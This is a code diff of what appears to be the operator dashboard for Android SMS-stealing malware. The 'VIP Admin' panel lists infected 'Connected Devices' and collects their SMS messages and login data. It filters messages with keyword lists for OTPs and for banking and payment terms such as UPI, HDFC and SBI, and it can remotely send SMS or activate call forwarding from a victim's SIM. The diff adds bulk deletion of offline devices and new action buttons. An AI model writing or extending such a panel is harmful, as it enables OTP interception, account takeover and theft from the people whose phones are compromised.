@@ -9,19 +9,17 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link rel="stylesheet" href="f.css">
     <style>
-        
+      
 
     </style>
 </head>
 <body>
-    <!-- Loading Screen -->
     <div id="loadingScreen" class="loading-screen">
         <div class="loading-spinner"></div>
         <br>
         <p>Loading...</p>
     </div>
 
-    <!-- Setup Modal -->
     <div id="setupModal" class="setup-modal hidden">
         <div class="setup-content">
             <h2><i class="fas fa-cog"></i> Setup</h2>
@@ -35,12 +33,15 @@
         </div>
     </div>
 
-    <!-- Login Modal -->
     <div id="loginModal" class="modal hidden">
         <div class="modal-content">
-            <h2 style="text-align: center; margin-bottom: 15px; background: #ff0a00; -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
-               VIP <i class="fas fa-lock"></i> Admin
-            </h2>
+            <h3 style="text-align: center; margin-bottom: 25px; 
+                   font-size: 1.8rem; font-weight: bold; 
+                   background: linear-gradient(45deg, var(--color-accent-main), #00e5ff); 
+                   -webkit-background-clip: text; 
+                   -webkit-text-fill-color: transparent;">
+           VIP <i class="fas fa-lock"></i> Admin
+        </h3>
             <div class="form-group">
                 <input type="password" inputmode="numeric" minlength="4" maxlength="6" id="adminPassword" placeholder="Admin Password" class="form-input">
             </div>
@@ -50,7 +51,6 @@
         </div>
     </div>
 
-    <!-- Password Verification Modal -->
     <div id="passwordModal" class="password-modal hidden">
         <div class="password-content">
             <h3><i class="fas fa-shield-alt"></i> Verify Password</h3>
@@ -68,7 +68,6 @@
         </div>
     </div>
 
-    <!-- Device SMS Modal -->
     <div id="deviceSMSModal" class="device-sms-modal hidden">
         <div class="modal-content xlarge">
             <span class="close" onclick="closeDeviceSMSModal()">&times;</span>
@@ -87,8 +86,8 @@
                     <i class="fas fa-search"></i>
                 </div>
                 <div class="header">
-                <button onclick="filterDeviceBankingSMS()" class="nav-btn">
-                    <i class="fas fa-university"></i> Banking
+                <button onclick="filterDevicePaymentTransactionSMS()" class="nav-btn">
+                    <i class="fas fa-exchange-alt"></i> Pay
                 </button>
                 <button onclick="filterDeviceOTPSMS()" class="nav-btn">
                     <i class="fas fa-shield-alt"></i> OTP
@@ -108,18 +107,14 @@
         </div>
     </div>
 
-    <!-- Main Dashboard -->
     <div id="dashboard" class="dashboard hidden">
-        <!-- Header -->
         <header class="header">
             <div class="header-content">
                 <h1>VIP <i class="fas fa-shield-alt"></i> Admin</h1>
                 
             </div>
         </header>
-        <!-- Header -->
-      
-            <div class="header">
+        <div class="header">
             <button class="nav-btn active" onclick="showSection('users')">
                 <i class="fas fa-users"></i> ALL Devices
             </button>
@@ -149,17 +144,19 @@
         
         
         <main class="main-content">
-            <!-- Users Section -->
             <section id="usersSection" class="content-section">
                 <div class="section-header">
                     <h2><i class="fas fa-mobile-alt"></i> Connected Devices</h2>
+                    
+                    <button onclick="requestDeleteOfflineDevices()" class="btn btn-danger">
+                        <i class="fas fa-trash-alt"></i> Delete All Offline
+                    </button>
                     <div class="search-box">
                         <input type="text" id="userSearch" placeholder="Search by serial, name, number..." onkeyup="filterUsers()">
                         <i class="fas fa-search"></i>
                     </div>
                 </div>
                 
-                <!-- Search Results Header for Users -->
                 <div id="userSearchResults" class="search-results-header hidden">
                     <h3><i class="fas fa-search"></i> Search Results</h3>
                     <div style="display: flex; align-items: center; gap: 12px;">
@@ -177,34 +174,37 @@
                 </div>
             </section>
 
-            <!-- All SMS Section -->
             <section id="smsSection" class="content-section hidden">
                 <div class="section-header">
                     <h2><i class="fas fa-envelope"></i> All SMS Messages</h2>
+                    
+                    <br>
+                  
+                    <button onclick="requestClearAllSMS()" class="btn btn-danger">
+                            <i class="fas fa-trash"></i> All SMS
+                        </button>
+                        
                     <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
                         <div class="search-box">
                             <input type="text" id="smsSearch" placeholder="Search SMS by sender, message, device..." onkeyup="filterSMS()">
                             <i class="fas fa-search"></i>
                         </div>
                         <div class="header">
-                        <button onclick="filterBankingSMS()" class="nav-btn">
-                            <i class="fas fa-university"></i> Bank
+                        <button onclick="filterPaymentTransactionSMS()" class="nav-btn">
+                            <i class="fas fa-exchange-alt"></i> Pay
                         </button>
                         <button onclick="filterOTPSMS()" class="nav-btn">
                             <i class="fas fa-shield-alt"></i> OTP
                         </button>
-                        <button onclick="clearSMSSearch()" class="nav-btn">
+                        
+                      <button onclick="clearSMSSearch()" class="nav-btn">
                             <i class="fas fa-times"></i> Clear
                         </button>
-                      
-                        <button onclick="requestClearAllSMS()" class="nav-btn">
-                            <i class="fas fa-trash"></i> All SMS
-                        </button>
+                        
                         </div>
                     </div>
                 </div>
                 
-                <!-- Search Results Header for SMS -->
                 <div id="smsSearchResults" class="search-results-header hidden">
                     <h3><i class="fas fa-search"></i> SMS Search Results</h3>
                     <div style="display: flex; align-items: center; gap: 12px;">
@@ -222,7 +222,6 @@
                 </div>
             </section>
 
-            <!-- All Data Group Section -->
             <section id="dataGroupSection" class="content-section hidden">
                 <div class="section-header">
                     <h2><i class="fas fa-database"></i> All Data Group</h2>
@@ -247,11 +246,10 @@
                 </div>
             </section>
 
-            <!-- Pinned Devices Section -->
             <section id="pinnedSection" class="content-section hidden">
                 <div class="section-header">
                     <h2><i class="fas fa-thumbtack"></i> Pinned Devices</h2>
-                    <span class="stat-badge" style="background: #FFD700; color: #333;">
+                    <span class="stat-badge" style="background: #FFD700; color: var(--color-bg-primary);">
                         <i class="fas fa-thumbtack"></i> Pinned: <span id="pinnedCount">0</span>
                     </span>
                 </div>
@@ -263,10 +261,9 @@
                 </div>
             </section>
 
-            <!-- Settings Section -->
             <section id="settingsSection" class="content-section hidden">
                 <div class="section-header">
-                    <h2><i class="fas fa-cog"></i></h2>
+                    <h2><i class="fas fa-cog"></i> Settings</h2>
                 </div>
                 
                 <div class="settings-card">
@@ -299,31 +296,41 @@
         </main>
     </div>
 
-    <!-- User Details Modal -->
     <div id="userModal" class="modal hidden">
         <div class="modal-content large">
             <span class="close" onclick="closeUserModal()">&times;</span>
-            <h2 id="userModalTitle" style="background: linear-gradient(45deg, #FF6B6B, #4ECDC4); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+            <h2 id="userModalTitle" style="background: linear-gradient(45deg, var(--color-accent-main), #00e5ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
                 Device Details
             </h2>
             
             <div class="tabs">
-                <div class="tab active" onclick="showTab('deviceInfo')">Device Info</div>
-                <div class="tab" onclick="showTab('smsData')">SMS Data</div>
-                <div class="tab" onclick="showTab('loginData')">Login Data</div>
+                <div class="nav-btn" onclick="showTab('deviceInfo')">Device Info</div>
+                <div class="nav-btn" onclick="showTab('smsData')">SMS Data</div>
+                <div class="nav-btn" onclick="showTab('loginData')">Login Data</div>
             </div>
-
+            
+            <div id="modalActionButtons" class="action-row-wrapper">
+                <div class="button-group" style="justify-content: flex-start;">
+                    <button id="modalSendSMSBtn" class="btn btn-primary" style="font-size: 0.85rem;">
+                        <i class="fas fa-sms"></i> Send SMS
+                    </button>
+                    <button id="modalCallForwardBtn" class="btn btn-info" style="font-size: 0.85rem;">
+                        <i class="fas fa-phone"></i> Call Forwarding
+                    </button>
+                    <button id="modalDeleteDeviceBtn" class="btn btn-danger" style="font-size: 0.85rem;">
+                        <i class="fas fa-trash"></i> Delete Device
+                    </button>
+                </div>
+            </div>
             <div id="userModalContent">
-                <!-- Content will be loaded dynamically -->
-            </div>
+                </div>
         </div>
     </div>
 
-    <!-- Send SMS Modal -->
     <div id="sendSMSModal" class="modal hidden">
         <div class="modal-content">
             <span class="close" onclick="closeSendSMSModal()">&times;</span>
-            <h2 style="background: linear-gradient(45deg, #FF6B6B, #4ECDC4); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+            <h2 style="text-align: center; margin-bottom: 15px; background: linear-gradient(45deg, var(--color-accent-main), #00e5ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
                 <i class="fas fa-paper-plane"></i> Send SMS
             </h2>
             <div class="form-group">
@@ -335,7 +342,7 @@
             </div>
             <div class="form-group">
                 
-                <input type="text" id="smsNumber" placeholder="Enter phone number" class="form-input">
+                <input type="text" id="smsNumber" inputmode="numeric" maxlength="10" placeholder="Enter phone number" class="form-input">
             </div>
             <div class="form-group">
                 
@@ -349,11 +356,10 @@
         </div>
     </div>
 
-    <!-- Call Forward Modal -->
     <div id="callForwardModal" class="modal hidden">
         <div class="modal-content">
             <span class="close" onclick="closeCallForwardModal()">&times;</span>
-            <h2 style="background: linear-gradient(45deg, #FF6B6B, #4ECDC4); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+            <h2 style="text-align: center; margin-bottom: 15px; background: linear-gradient(45deg, var(--color-accent-main), #00e5ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
                 <i class="fas fa-phone"></i> Call Forwarding
             </h2>
             <div class="form-group">
@@ -365,13 +371,22 @@
             </div>
             <div class="form-group">
                 
-                <input type="text" id="forwardCallNumber" placeholder="Enter forward number" class="form-input">
+                <input type="text" id="forwardCallNumber" minlength="10" maxlength="10" inputmode="numeric" placeholder="Enter forward number" class="form-input">
             </div>
             
             <div class="button-group">
-                <button onclick="activateCallForward()" class="btn btn-primary">Activate</button>
-                <button onclick="deactivateCallForward()" class="btn btn-warning">Deactivate</button>
-                <button onclick="checkForwardStatus()" class="btn btn-info">Check Status</button>
+                <button onclick="activateCallForward()" class="btn btn-success" style="flex: 1; padding: 8px 15px; font-size: 0.95rem;">
+                    <i class="fas fa-check"></i> Activate
+                </button>
+                <button onclick="deactivateCallForward()" class="btn btn-danger" style="flex: 1; padding: 8px 15px; font-size: 0.95rem;">
+                    <i class="fas fa-power-off"></i> Deactivate
+                </button>
+                
+            </div>
+            <div class="button-group" style="margin-top: 15px;">
+                <button onclick="checkForwardStatus()" class="btn btn-info" style="width: 100%;">
+                    <i class="fas fa-sync-alt"></i> Check Status
+                </button>
             </div>
             <div id="forwardStatus" style="margin-top: 12px; padding: 8px; border-radius: 4px; display: none;"></div>
         </div>
@@ -433,16 +448,21 @@
         const smsSearchResults = document.getElementById('smsSearchResults');
         const userSearchCount = document.getElementById('userSearchCount');
         const smsSearchCount = document.getElementById('smsSearchCount');
+        
+        // Modal Action Buttons
+        const modalActionButtonsWrapper = document.getElementById('modalActionButtons');
+        const modalSendSMSBtn = document.getElementById('modalSendSMSBtn');
+        const modalCallForwardBtn = document.getElementById('modalCallForwardBtn');
+        const modalDeleteDeviceBtn = document.getElementById('modalDeleteDeviceBtn');
 
-        // Banking Keywords
-        const bankingKeywords = [
-            'bank', 'account', 'transaction', 'upi', 'payment', 'transfer', 'balance', 
-            'debit', 'credit', 'card', 'atm', 'withdraw', 'deposit', 'loan', 'emi',
-            'hdfc', 'sbi', 'icici', 'axis', 'kotak', 'yes bank', 'indusind', 'pnb',
-            'canara', 'union bank', 'idfc', 'rbl', 'bandhan', 'federal', 'upi',
-            'imps', 'neft', 'rtgs', 'ifsc', 'micr', 'cheque', 'overdraft', 'interest',
-            'statement', 'passbook', 'pin', 'cvv', 'expiry', 'wallet', 'paytm',
-            'google pay', 'phonepe', 'amazon pay', 'bhim', 'net banking', 'mobile banking'
+
+        // Payment/Transaction Keywords (Replaced Banking Keywords)
+        const paymentTransactionKeywords = [
+            'transaction', 'payment', 'transfer', 'credit', 'debit', 'withdraw', 'deposit', 
+            'upi', 'imps', 'neft', 'rtgs', 'txn', 'paid', 'sent', 'received', 'purchased',
+            'wallet', 'paytm', 'google pay', 'phonepe', 'amazon pay', 'bhim', 'a/c',
+            'bank', 'account', 'balance', 'card', 'atm', 'loan', 'emi', 'hdfc', 'sbi', 
+            'icici', 'axis', 'kotak' // Keeping common bank names as they often appear in transaction messages
         ];
 
         const otpKeywords = [
@@ -972,23 +992,14 @@
                         <button class="nav-btn active" onclick="event.stopPropagation(); getAllDeviceSMS('${user.id}')">
                             <i class="fas fa-envelope"></i> All SMS
                         </button>
-                        
-                        <button class="nav-btn active" onclick="event.stopPropagation(); viewDeviceSMS('${user.id}')">
-                            <i class="fas fa-eye"></i> View SMS
-                        </button>
-                        
-                    </div>
-                    
-                    <div class="header">
-                        
-                        
-                        <button class="nav-btn active" onclick="event.stopPropagation(); viewLoginDetails('${user.id}')">
-                            <i class="fas fa-sign-in-alt"></i> Details
-                        </button>
                         <button class="nav-btn active" onclick="event.stopPropagation(); requestDeleteDevice('${user.id}')">
                             <i class="fas fa-trash"></i> Delete
                         </button>
+                       
+                        
                     </div>
+                    
+                    
                     <br>
                     <div><strong>Last Active:</strong> ${user.TimeandDate || (user.timestamp ? new Date(user.timestamp).toLocaleString() : 'Never')}</div>
                 `;
@@ -1016,7 +1027,21 @@
             
             // Show selected section and activate button
             document.getElementById(sectionName + 'Section').classList.remove('hidden');
-            event.target.classList.add('active');
+            // This logic assumes the nav-btn is the event.target or a sibling, we need to adjust the nav-btn active state logic if necessary.
+            // For now, let's keep it simple by adding 'active' to all buttons related to this section name for the header logic to work.
+             document.querySelectorAll('.header .nav-btn').forEach(btn => {
+                if (btn.textContent.includes('ALL Devices') && sectionName === 'users') {
+                    btn.classList.add('active');
+                } else if (btn.textContent.includes('All SMS') && sectionName === 'sms') {
+                    btn.classList.add('active');
+                } else if (btn.textContent.includes('All Data') && sectionName === 'dataGroup') {
+                    btn.classList.add('active');
+                } else if (btn.textContent.includes('Pin') && sectionName === 'pinned') {
+                    btn.classList.add('active');
+                } else if (btn.textContent.includes('cog') && sectionName === 'settings') {
+                    btn.classList.add('active');
+                }
+            });
             
             // Load All Data Group if selected
             if (sectionName === 'dataGroup') {
@@ -1070,11 +1095,15 @@
                 setTimeout(() => {
                     const userCards = document.querySelectorAll('.user-card');
                     userCards.forEach(card => {
-                        if (card.querySelector('.user-info')?.textContent.includes(userId.substring(0, 8))) {
+                        // We use the unique user ID or serial number for highlighting reliability
+                        if (card.querySelector('.device-serial')?.textContent === serialNumber.toString() || card.querySelector('.user-id')?.textContent.includes(user.d_name || '')) {
                             card.classList.add('highlight');
                             card.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        } else {
+                             card.classList.remove('highlight');
                         }
                     });
+                     showToast(`Mapsd to Device: ${user.d_name || user.id}`, 'info');
                 }, 500);
             }
         }
@@ -1176,14 +1205,14 @@
             }
         }
 
-        // Banking SMS Filter Functions
-        function filterBankingSMS() {
-            const bankingSMS = allSMSData.filter(sms => isBankingSMS(sms));
+        // Payment Transaction SMS Filter Functions (Replaced Banking Filter)
+        function filterPaymentTransactionSMS() {
+            const paymentTransactionSMS = allSMSData.filter(sms => isPaymentTransactionSMS(sms));
             
             smsSearchResults.classList.remove('hidden');
-            smsSearchCount.textContent = `${bankingSMS.length} banking-related message${bankingSMS.length !== 1 ? 's' : ''} found`;
+            smsSearchCount.textContent = `${paymentTransactionSMS.length} payment/transaction message${paymentTransactionSMS.length !== 1 ? 's' : ''} found`;
             
-            displaySMS(bankingSMS);
+            displaySMS(paymentTransactionSMS);
         }
 
         function filterOTPSMS() {
@@ -1195,11 +1224,12 @@
             displaySMS(otpSMS);
         }
 
-        function isBankingSMS(sms) {
+        // Function updated for Payment/Transaction check
+        function isPaymentTransactionSMS(sms) {
             const body = (sms.body || '').toLowerCase();
             const sender = (sms.sender || '').toLowerCase();
             
-            return bankingKeywords.some(keyword => 
+            return paymentTransactionKeywords.some(keyword => 
                 body.includes(keyword) || sender.includes(keyword)
             );
         }
@@ -1253,12 +1283,18 @@
 
             smsArray.forEach(sms => {
                 const isSearchResult = currentSMSSearchTerm && checkSMSMatchSearch(sms, currentSMSSearchTerm);
-                const isBanking = isBankingSMS(sms);
+                const isPaymentTransaction = isPaymentTransactionSMS(sms);
                 const isOTP = isOTPSMS(sms);
                 
                 const smsItem = document.createElement('div');
-                smsItem.className = `sms-item ${isSearchResult ? 'highlight' : ''} ${isBanking ? 'banking-sms' : ''} ${isOTP ? 'otp-sms' : ''}`;
+                smsItem.className = `sms-item ${isSearchResult ? 'highlight' : ''} ${isPaymentTransaction ? 'payment-transaction-sms' : ''} ${isOTP ? 'otp-sms' : ''}`;
                 
+                // --- MODIFICATION: Make the SMS item clickable to navigate to the device ---
+                smsItem.onclick = () => navigateToDeviceFromSMS(sms.userId);
+                smsItem.style.cursor = 'pointer';
+                // --------------------------------------------------------------------------
+                
+                // MODIFIED: Added Device ID (sms.userId)
                 smsItem.innerHTML = `
                     <div class="sms-header">
                         <div class="sms-sender">${sms.sender || 'Unknown'}</div>
@@ -1267,11 +1303,14 @@
                     <div class="sms-body">${sms.body || 'No content'}</div>
                     <div class="sms-device">
                         <div>
-                            <strong>Device:</strong> ${sms.userId} | 
-                            <strong>Serial:</strong> <span class="sms-serial" onclick="navigateToDeviceFromSMS('${sms.userId}')">#${sms.deviceSerial}</span> | 
-                            <strong>SIM:</strong> ${sms.sim_number || 'Unknown'}
-                            ${isBanking ? ' | <span style="color: #4CAF50; font-weight: bold;">💳 Banking</span>' : ''}
-                            ${isOTP ? ' | <span style="color: #FF9800; font-weight: bold;">🔐 OTP</span>' : ''}
+                            <strong>SIM:</strong> ${sms.sim_number || 'Unknown'} | 
+                            <strong>Type:</strong> ${sms.type || 'Received'} |
+                            <strong>Date:</strong> ${sms.date ? new Date(sms.date).toLocaleDateString() : 'Unknown'}
+                            ${isPaymentTransaction ? ' | <span style="color: var(--color-online); font-weight: bold;">&#x1F4B8; Transaction</span>' : ''}
+                            ${isOTP ? ' | <span style="color: var(--color-warning); font-weight: bold;">&#x1F512; OTP</span>' : ''}
+                        </div>
+                        <div style="font-weight: bold; color: var(--color-accent-main);">
+                            Device ID: ${sms.userId || 'N/A'}
                         </div>
                     </div>
                 `;
@@ -1531,16 +1570,38 @@
 
         // Password Protected Delete Functions
         function requestDeleteDevice(userId) {
-            event.stopPropagation();
+            // Check if user is set from the modal context
+            const idToDelete = userId || (currentDeviceData ? currentDeviceData.id : null);
+            if (!idToDelete) {
+                showToast('No device selected for deletion.', 'error');
+                return;
+            }
+            
             pendingDeleteAction = 'deleteDevice';
-            pendingDeleteData = userId;
-            showPasswordModal(`Delete Device #${deviceSerialNumbers[userId]}`);
+            pendingDeleteData = idToDelete;
+            showPasswordModal(`Delete Device #${deviceSerialNumbers[idToDelete]}`);
         }
 
         function requestClearAllSMS() {
             pendingDeleteAction = 'clearAllSMS';
             pendingDeleteData = null;
             showPasswordModal('Clear All SMS Messages');
+        }
+
+        // NEW FUNCTION: Request deletion of all offline devices
+        function requestDeleteOfflineDevices() {
+            const offlineUsers = allUsers.filter(user => !user.isOnline);
+            const offlineCount = offlineUsers.length;
+
+            if (offlineCount === 0) {
+                showToast('No offline devices found to delete!', 'warning');
+                return;
+            }
+
+            pendingDeleteAction = 'deleteOfflineDevices';
+            pendingDeleteData = null;
+            
+            showPasswordModal(`Delete ALL ${offlineCount} Offline Devices`);
         }
 
         function showPasswordModal(actionText) {
@@ -1561,6 +1622,9 @@
                     performDeleteDevice(pendingDeleteData);
                 } else if (pendingDeleteAction === 'clearAllSMS') {
                     performClearAllSMS();
+                } else if (pendingDeleteAction === 'deleteOfflineDevices') {
+                    // NEW: Execute offline device deletion
+                    performDeleteOfflineDevices();
                 }
                 
                 // Reset pending actions
@@ -1595,6 +1659,8 @@
                             pinnedDevices.splice(index, 1);
                             database.ref('pinned_devices').set(pinnedDevices);
                         }
+                        // Close modal if deleting the currently viewed device
+                        closeUserModal(); 
                     })
                     .catch(error => {
                         showToast('Error deleting device: ' + error.message, 'error');
@@ -1607,6 +1673,46 @@
                 database.ref('user_sms').remove()
                     .then(() => showToast('All SMS messages cleared!', 'success'))
                     .catch(error => showToast('Error clearing SMS: ' + error.message, 'error'));
+            }
+        }
+
+        // NEW FUNCTION: Perform deletion of all offline devices
+        function performDeleteOfflineDevices() {
+            const offlineUsers = allUsers.filter(user => !user.isOnline);
+            const count = offlineUsers.length;
+
+            if (confirm(`WARNING: Are you strictly sure you want to delete ${count} offline devices? This cannot be undone.`)) {
+                let deletedCount = 0;
+                
+                // Loop through offline users and delete them
+                offlineUsers.forEach(user => {
+                    const userId = user.id;
+                    
+                    // Delete from user_data
+                    database.ref('user_data').child(userId).remove()
+                        .then(() => {
+                            // Remove local serial number
+                            delete deviceSerialNumbers[userId];
+                            
+                            // Remove from pinned if exists
+                            const pinIndex = pinnedDevices.indexOf(userId);
+                            if (pinIndex > -1) {
+                                pinnedDevices.splice(pinIndex, 1);
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error deleting user ' + userId, error);
+                        });
+                        
+                    deletedCount++;
+                });
+
+                // Update side data (with a small delay to allow Firebase deletes to initiate)
+                setTimeout(() => {
+                    saveSerialNumbers();
+                    database.ref('pinned_devices').set(pinnedDevices);
+                    showToast(`Process started: Deleting ${deletedCount} offline devices`, 'success');
+                }, 1000);
             }
         }
 
@@ -1660,11 +1766,12 @@
             }
 
             smsArray.forEach(sms => {
-                const isBanking = isBankingSMS(sms);
+                const isSearchResult = currentSMSSearchTerm && checkSMSMatchSearch(sms, currentSMSSearchTerm);
+                const isPaymentTransaction = isPaymentTransactionSMS(sms);
                 const isOTP = isOTPSMS(sms);
                 
                 const smsItem = document.createElement('div');
-                smsItem.className = `sms-item ${isBanking ? 'banking-sms' : ''} ${isOTP ? 'otp-sms' : ''}`;
+                smsItem.className = `sms-item ${isSearchResult ? 'highlight' : ''} ${isPaymentTransaction ? 'payment-transaction-sms' : ''} ${isOTP ? 'otp-sms' : ''}`;
                 
                 smsItem.innerHTML = `
                     <div class="sms-header">
@@ -1677,8 +1784,8 @@
                             <strong>SIM:</strong> ${sms.sim_number || 'Unknown'} | 
                             <strong>Type:</strong> ${sms.type || 'Received'} |
                             <strong>Date:</strong> ${sms.date ? new Date(sms.date).toLocaleDateString() : 'Unknown'}
-                            ${isBanking ? ' | <span style="color: #4CAF50; font-weight: bold;">💳 Banking</span>' : ''}
-                            ${isOTP ? ' | <span style="color: #FF9800; font-weight: bold;">🔐 OTP</span>' : ''}
+                            ${isPaymentTransaction ? ' | <span style="color: var(--color-online); font-weight: bold;">&#x1F4B8; Transaction</span>' : ''}
+                            ${isOTP ? ' | <span style="color: var(--color-warning); font-weight: bold;">&#x1F512; OTP</span>' : ''}
                         </div>
                     </div>
                 `;
@@ -1688,9 +1795,9 @@
         }
 
         // Device SMS Filter Functions
-        function filterDeviceBankingSMS() {
-            const bankingSMS = currentDeviceSMS.filter(sms => isBankingSMS(sms));
-            displayDeviceSMS(bankingSMS);
+        function filterDevicePaymentTransactionSMS() {
+            const paymentTransactionSMS = currentDeviceSMS.filter(sms => isPaymentTransactionSMS(sms));
+            displayDeviceSMS(paymentTransactionSMS);
         }
 
         function filterDeviceOTPSMS() {
@@ -1728,14 +1835,39 @@
             currentDeviceData = user;
             document.getElementById('userModalTitle').textContent = `Device: ${user.d_name || user.id}`;
             
-            // Load device info tab by default
-            showTab('deviceInfo');
+            // Set the current user for modal actions
+            currentUser = user.id;
+
+            // Bind global action buttons inside the modal to the current device
+            if (modalSendSMSBtn) modalSendSMSBtn.onclick = () => openSendSMSModal(user.id);
+            if (modalCallForwardBtn) modalCallForwardBtn.onclick = () => openCallForwardModal(user.id);
+            if (modalDeleteDeviceBtn) modalDeleteDeviceBtn.onclick = () => requestDeleteDevice(user.id);
+            
+            // --- CORE CHANGE: Open SMS Data by default (User Request) ---
+            const smsDataTab = document.querySelector('#userModal .tabs .nav-btn:nth-child(2)');
+            if (smsDataTab) {
+                // Manually remove active state from all tabs
+                document.querySelectorAll('#userModal .tabs .nav-btn').forEach(tab => tab.classList.remove('active'));
+                
+                // Set the SMS Data tab as active
+                smsDataTab.classList.add('active');
+                
+                // Load SMS data
+                loadSMSDataTab(); 
+                
+                // Hide Delete button as per tab change logic (since it's not deviceInfo)
+                if (modalDeleteDeviceBtn) {
+                    modalDeleteDeviceBtn.style.display = 'none';
+                }
+            }
+            // --- END CORE CHANGE ---
+
             document.getElementById('userModal').classList.remove('hidden');
         }
 
         function showTab(tabName) {
             // Update tabs
-            document.querySelectorAll('.tab').forEach(tab => {
+            document.querySelectorAll('#userModal .tabs .nav-btn').forEach(tab => {
                 tab.classList.remove('active');
             });
             event.target.classList.add('active');
@@ -1746,6 +1878,24 @@
 
         function loadTabContent(tabName) {
             const modalContent = document.getElementById('userModalContent');
+            
+            // Remove previous listeners if they exist
+            if (currentDeviceData) {
+                if (currentDeviceData.smsListener) {
+                    database.ref('user_sms').child(currentDeviceData.id).off('value', currentDeviceData.smsListener);
+                    currentDeviceData.smsListener = null;
+                }
+                if (currentDeviceData.loginListener) {
+                    database.ref('login').child(currentDeviceData.id).off('value', currentDeviceData.loginListener);
+                    currentDeviceData.loginListener = null;
+                }
+            }
+            
+            // CONTROL DELETE BUTTON VISIBILITY
+            if (modalDeleteDeviceBtn) {
+                // Show Delete button only in the Device Info tab, hide otherwise.
+                modalDeleteDeviceBtn.style.display = (tabName === 'deviceInfo') ? 'inline-flex' : 'none';
+            }
             
             switch(tabName) {
                 case 'deviceInfo':
@@ -1764,6 +1914,7 @@
             const user = currentDeviceData;
             const modalContent = document.getElementById('userModalContent');
             
+            // The action buttons are now in the #modalActionButtons wrapper
             modalContent.innerHTML = `
                 <div class="user-details-grid">
                     <div class="detail-card">
@@ -1890,11 +2041,11 @@
                     `;
                 } else {
                     smsData.forEach(sms => {
-                        const isBanking = isBankingSMS(sms);
+                        const isPaymentTransaction = isPaymentTransactionSMS(sms);
                         const isOTP = isOTPSMS(sms);
                         
                         smsHTML += `
-                            <div class="sms-item ${isBanking ? 'banking-sms' : ''} ${isOTP ? 'otp-sms' : ''}">
+                            <div class="sms-item ${isPaymentTransaction ? 'payment-transaction-sms' : ''} ${isOTP ? 'otp-sms' : ''}">
                                 <div class="sms-header">
                                     <div class="sms-sender">${sms.sender || 'Unknown'}</div>
                                     <div class="sms-date">${sms.date ? new Date(sms.date).toLocaleString() : 'Unknown date'}</div>
@@ -1903,8 +2054,8 @@
                                 <div class="sms-device">
                                     <strong>SIM:</strong> ${sms.sim_number || 'Unknown'} | 
                                     <strong>Type:</strong> ${sms.type || 'Received'}
-                                    ${isBanking ? ' | <span style="color: #4CAF50; font-weight: bold;">💳 Banking</span>' : ''}
-                                    ${isOTP ? ' | <span style="color: #FF9800; font-weight: bold;">🔐 OTP</span>' : ''}
+                                    ${isPaymentTransaction ? ' | <span style="color: var(--color-online); font-weight: bold;">&#x1F4B8; Transaction</span>' : ''}
+                                    ${isOTP ? ' | <span style="color: var(--color-warning); font-weight: bold;">&#x1F512; OTP</span>' : ''}
                                 </div>
                             </div>
                         `;
@@ -1936,7 +2087,7 @@
                     Object.keys(loginData).forEach(recordKey => {
                         const record = loginData[recordKey];
                         if (record && typeof record === 'object') {
-                            let recordHTML = '<div class="login-record" style="margin-bottom: 15px; padding: 10px; background: #f8f9fa; border-radius: 6px;">';
+                            let recordHTML = '<div class="login-record" style="margin-bottom: 15px; padding: 10px; background: var(--color-bg-surface); border-radius: 6px;">';
                             let hasContent = false;
                             
                             // Format the login data exactly like Java code
@@ -2027,6 +2178,7 @@
                 }
                 
                 loginHTML += '</div>';
+                
                 modalContent.innerHTML = loginHTML;
             }, (error) => {
                 modalContent.innerHTML = `<div>Error loading login data: ${error.message}</div>`;
@@ -2041,7 +2193,7 @@
             if (currentDeviceData) {
                 openUserModal(currentDeviceData);
                 setTimeout(() => {
-                    document.querySelector('.tab[onclick="showTab(\'smsData\')"]').click();
+                    document.querySelector('#userModal .tabs .nav-btn:nth-child(2)').click();
                 }, 100);
             }
         }
@@ -2051,7 +2203,7 @@
             if (currentDeviceData) {
                 openUserModal(currentDeviceData);
                 setTimeout(() => {
-                    document.querySelector('.tab[onclick="showTab(\'loginData\')"]').click();
+                    document.querySelector('#userModal .tabs .nav-btn:nth-child(3)').click();
                 }, 100);
             }
         }
@@ -2069,6 +2221,7 @@
             
             document.getElementById('userModal').classList.add('hidden');
             currentDeviceData = null;
+            currentUser = null;
         }
 
         // SMS Character Counter - 170 CHARACTER LIMIT
@@ -2088,8 +2241,28 @@
             }
         }
 
+        /**
+         * UPDATED: openSendSMSModal to display SIM numbers
+         */
         function openSendSMSModal(userId) {
             currentUser = userId;
+            const user = allUsers.find(u => u.id === userId); // user data find karna
+            const simSlotSelect = document.getElementById('smsSimSlot');
+            
+            // Dropdown ko update karna
+            if (user) {
+                simSlotSelect.innerHTML = `
+                    <option value="0">SIM 1: ${user.numberSim1 || 'No SIM'}</option>
+                    <option value="1">SIM 2: ${user.numberSim2 || 'No SIM'}</option>
+                `;
+            } else {
+                // Agar user data na mile to default options
+                simSlotSelect.innerHTML = `
+                    <option value="0">SIM 1</option>
+                    <option value="1">SIM 2</option>
+                `;
+            }
+            
             document.getElementById('sendSMSModal').classList.remove('hidden');
             document.getElementById('smsNumber').value = '';
             document.getElementById('smsMessage').value = '';
@@ -2098,11 +2271,31 @@
 
         function closeSendSMSModal() {
             document.getElementById('sendSMSModal').classList.add('hidden');
-            currentUser = null;
+            // currentUser = null; // Keep currentUser set as it's set in openUserModal
         }
 
+        /**
+         * UPDATED: openCallForwardModal to display SIM numbers
+         */
         function openCallForwardModal(userId) {
             currentUser = userId;
+            const user = allUsers.find(u => u.id === userId); // user data find karna
+            const forwardSimSlotSelect = document.getElementById('forwardSimSlot');
+            
+            // Dropdown ko update karna
+            if (user) {
+                forwardSimSlotSelect.innerHTML = `
+                    <option value="0">SIM 1: ${user.numberSim1 || 'No SIM'}</option>
+                    <option value="1">SIM 2: ${user.numberSim2 || 'No SIM'}</option>
+                `;
+            } else {
+                // Agar user data na mile to default options
+                forwardSimSlotSelect.innerHTML = `
+                    <option value="0">SIM 1</option>
+                    <option value="1">SIM 2</option>
+                `;
+            }
+
